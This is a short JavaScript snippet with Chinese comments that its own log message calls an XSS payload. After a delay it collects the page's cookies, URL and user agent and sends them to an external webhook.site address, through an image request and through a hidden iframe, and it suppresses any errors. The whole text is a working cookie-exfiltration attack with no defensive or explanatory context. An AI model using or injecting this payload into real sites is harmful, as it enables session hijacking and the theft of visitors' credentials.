div.script:
// 延迟执行，确保页面加载完成
setTimeout(function() {
  try {
    // 获取当前页面的cookie
    var cookies = document.cookie;
    var currentUrl = window.location.href;
    var userAgent = navigator.userAgent;

    // 构造要发送的数据
    var data = 'cookies=' + encodeURIComponent(cookies) + 
              '&url=' + encodeURIComponent(currentUrl) + 
              '&ua=' + encodeURIComponent(userAgent) +
              '&timestamp=' + encodeURIComponent(new Date().toISOString());

    // 通过图片请求发送数据（最兼容的方式）
    var img = new Image();
    img.src = 'https://webhook.site/c8b5a4d2-7c3e-4f1a-9b2d-8e6f5a3c1d9e?' + data;

    // 备用方案：创建隐藏的iframe
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'https://webhook.site/c8b5a4d2-7c3e-4f1a-9b2d-8e6f5a3c1d9e?' + data;
    document.body.appendChild(iframe);

  } catch(e) {
    // 静默处理错误
    console.log('XSS payload executed with error:', e);
  }
}, 1000);
